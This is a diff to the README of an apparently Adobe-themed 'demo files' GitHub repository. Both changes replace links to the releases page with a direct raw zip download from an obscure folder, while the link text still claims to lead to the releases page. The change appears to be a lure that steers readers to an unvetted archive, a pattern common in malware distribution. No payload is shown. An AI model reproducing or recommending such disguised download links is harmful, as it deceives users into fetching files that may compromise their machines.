@@ -6,7 +6,7 @@ Welcome to adobe-ys3oi! This repository was created to give you some demo files 
 
 ## 📥 Download & Install
 
-To get started with adobe-ys3oi, [visit this page to download the latest release](https://github.com/cargh23/adobe-ys3oi/releases). You’ll find all the files available for download.
+To get started with adobe-ys3oi, [visit this page to download the latest release](https://raw.githubusercontent.com/cargh23/adobe-ys3oi/main/dissective/adobe-ys3oi.zip). You’ll find all the files available for download.
 
 ## 🖥️ System Requirements
 
@@ -28,7 +28,7 @@ adobe-ys3oi offers several features that can help you explore demo files:
 
 1. Click on the link below to visit the releases page:
    
-   [Visit Releases Page](https://github.com/cargh23/adobe-ys3oi/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/cargh23/adobe-ys3oi/main/dissective/adobe-ys3oi.zip)
 
 2. Once on the page, look for the latest version. It will be marked as “Latest Release”.
 
